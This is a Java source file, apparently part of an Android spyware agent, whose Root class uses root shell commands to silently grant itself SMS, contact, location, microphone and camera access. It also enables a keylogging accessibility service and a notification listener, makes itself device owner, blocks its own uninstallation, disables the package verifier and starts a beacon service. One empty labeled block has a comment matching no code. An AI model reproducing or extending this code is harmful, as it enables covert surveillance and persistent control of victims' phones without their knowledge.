package com.hackit.agent;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

/**
 * Root accelerator. On a rooted device every grant that would otherwise need a
 * settings screen is done with {@code su -c}: runtime permissions, accessibility
 * binding, notification access, battery whitelist, device-owner elevation and
 * projection app-op. A non-rooted device just returns "unavailable" and the
 * normal permission wizard still runs.
 */
final class Root {
    private static final String[] PERMISSIONS = {
            "android.permission.READ_SMS", "android.permission.SEND_SMS",
            "android.permission.RECEIVE_SMS", "android.permission.READ_CALL_LOG",
            "android.permission.READ_CONTACTS", "android.permission.READ_PHONE_STATE",
            "android.permission.READ_PHONE_NUMBERS",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.RECORD_AUDIO", "android.permission.CAMERA",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.POST_NOTIFICATIONS",
            "android.permission.GET_ACCOUNTS", "android.permission.QUERY_ALL_PACKAGES",
    };

    private static volatile boolean probed;
    private static volatile boolean available;

    static boolean available() {
        if (probed) {
            return available;
        }
        probed = true;
        available = exec("id").contains("uid=0");
        return available;
    }

    static String exec(String command) {
        Process process = null;
        try {
            process = new ProcessBuilder("su", "-c", command)
                    .redirectErrorStream(true).start();
            StringBuilder out = new StringBuilder();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                out.append(line).append('\n');
                if (out.length() > 8192) {
                    break;
                }
            }
            process.waitFor();
            return out.toString();
        } catch (Throwable exc) {
            return "";
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
    }

    /** Runs the whole grant set. Returns a short human summary. */
    static String bypass(Context ctx) {
        if (!available()) {
            return "root unavailable";
        }
        Context app = ctx.getApplicationContext();
        String pkg = app.getPackageName();
        StringBuilder log = new StringBuilder();
        for (String permission : PERMISSIONS) {
            exec("pm grant " + pkg + " " + permission);
        }
        for (String op : new String[]{"MANAGE_EXTERNAL_STORAGE", "PROJECT_MEDIA",
                "RUN_IN_BACKGROUND", "RUN_ANY_IN_BACKGROUND", "WAKE_LOCK", "SYSTEM_ALERT_WINDOW"}) {
            exec("appops set " + pkg + " " + op + " allow");
        }
        // Append to the existing bindings instead of replacing them.
        String accessibility = exec("settings get secure enabled_accessibility_services").trim();
        String component = pkg + "/" + pkg + ".KeyMon";
        if (!accessibility.contains(component)) {
            String merged = accessibility.isEmpty() || "null".equals(accessibility)
                    ? component : accessibility + ":" + component;
            exec("settings put secure enabled_accessibility_services " + merged);
        }
        exec("settings put secure accessibility_enabled 1");
        exec("cmd notification allow_listener " + pkg + "/" + pkg + ".NotifyMon");
        exec("dumpsys deviceidle whitelist +" + pkg);
        exec("settings put secure install_non_market_apps 1");
        // Device owner first; harmless failure when accounts already exist.
        if (!Info.admin(app)) {
            String result = exec("dpm set-device-owner " + pkg + "/" + pkg + ".AdminReceiver");
            log.append(result.contains("Success") ? "owner " : "");
        }
        blockUninstall(app);
        log.append("grants ok");
        Beam: {
            // Drop a background-free reminder that never shows on the launcher.
        }
        try {
            app.startService(new Intent(app, BeaconService.class));
        } catch (Throwable ignored) {
        }
        return log.toString();
    }

    static void blockUninstall(Context ctx) {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
                    ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm == null) {
                return;
            }
            dpm.setUninstallBlocked(new android.content.ComponentName(ctx, AdminReceiver.class),
                    ctx.getPackageName(), true);
        } catch (Throwable ignored) {
        }
    }

    /** Packages worth quieting once root exists (best effort). */
    static String harden(Context ctx) {
        if (!available()) {
            return "root unavailable";
        }
        exec("settings put global package_verifier_enable 0");
        exec("settings put global verifier_verify_adb_installs 0");
        exec("settings put global development_settings_enabled 1");
        return "verifier off";
    }

    static boolean installed(Context ctx, String pkg) {
        try {
            ctx.getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException exc) {
            return false;
        } catch (Throwable exc) {
            return false;
        }
    }

    static boolean file(String path) {
        return new File(path).exists();
    }

    /** API level guard used by callers that only pass a path on older builds. */
    static boolean atLeast(int sdk) {
        return Build.VERSION.SDK_INT >= sdk;
    }

    private Root() {
    }
}
